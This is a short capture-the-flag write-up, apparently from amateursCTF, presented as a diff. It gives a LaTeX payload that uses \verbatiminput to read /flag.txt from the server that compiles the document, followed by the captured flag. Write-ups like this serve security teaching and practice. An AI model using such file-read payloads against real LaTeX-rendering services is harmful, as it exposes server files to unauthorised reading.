@@ -1,0 +1,12 @@
+# Latek
+
+very basic payload:
+
+```latex
+\documentclass{article}
+\usepackage{verbatim}
+\begin{document}
+\verbatiminput{/flag.txt}
+\end{document} 
+```
+amateursCTF{th3_l0w_budg3t_and_n0_1nstanc3ing_caus3d_us_t0_n0t_all0w_rc3_sadly}
